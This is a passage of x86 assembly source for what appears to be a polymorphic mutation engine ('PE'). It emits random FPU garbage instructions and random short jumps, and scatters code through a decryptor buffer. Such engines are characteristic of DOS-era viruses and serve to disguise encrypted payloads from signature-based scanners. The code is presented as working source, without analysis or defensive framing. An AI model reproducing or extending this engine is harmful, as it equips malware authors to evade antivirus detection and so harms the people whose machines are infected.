                FNCLEX
                FNOP
                FPATAN
                FPREM
                FPREM1
                FPTAN
                FRNDINT
                FSCALE
                FSIN
                FSINCOS
                FSQRT
                FST
                FSTP
                FSUB
                FSUBP
                FSUBR
                FSUBRP
                FTST
                FUCOM
                FUCOMP
                FUCOMPP
                FXAM
                FXTRACT
                FYL2X
                FYL2XP1
cmd2byte_size   equ ($-cmd2byte)/2

f_init          db 0

gen_2byte:      cmp f_init, 1
                je @@1

                mov ax, 0E3DBH  ; finit
                stosw

                mov f_init, 1
                ret

@@1:            mov f_init, 0

                mov ax, cmd2byte_size
                call rnd
                shl ax, 1
                xchg si, ax
                mov ax, cmd2byte[si]
                stosw

                ret

gen_short_jmp:  call random
                and al, 0fh
                or  al, 70h
                stosb
                mov ax, 3
                call rnd
                inc ax
                stosb
                xchg cx, ax
@@1:            call gen_1byte
                loop @@1
                ret

scan_space:     mov si, di
                xor cx, cx
@@1:            cmp si, offset decrypt_buf + MAX  - 100
                jae @@2
                lodsb
                or al, al
                jnz @@2
                inc cx
                jmp @@1
@@2:            ret

gen_jmp:        mov al, 0E9H
                stosb
                stosw
                push di

                call find_space
                jc error

                pop bx          ; xxxx
                mov ax, di
                sub ax, bx
                mov [bx-2], ax

@@1:            ret

                ; найти свободное место

find_space:     mov dx, 1000

fnd_nxt:        mov ax, MAX - 100         ; в DI рандомное зачение
                call rnd
                add ax, offset decrypt_buf
                xchg di, ax

                call scan_space
                cmp cx, 100
                jae space_found

                dec dx
                jnz fnd_nxt

                JMP ERROR

space_found:    add di, 10

                ret

; ============= random number generator =====================================

include         random.inc

; ===========================================================================

PE_end:
PE_size         equ PE_end-PE_start

                DB 13,10
                DB 13,10
                DB 'PE used '
                if PE_size / 1000 NE 0
                DB PE_size / 1000 + '0'
                endif
                DB PE_size / 100 mod 10 + '0'
                DB PE_size / 10 mod 10 + '0'
                DB PE_size mod 10 + '0'
                db ' byte(s)',13,10

eof:

decrypt_buf:    db max + 16384 dup (?)
encrypt_buf:    db max dup (?)

                end start
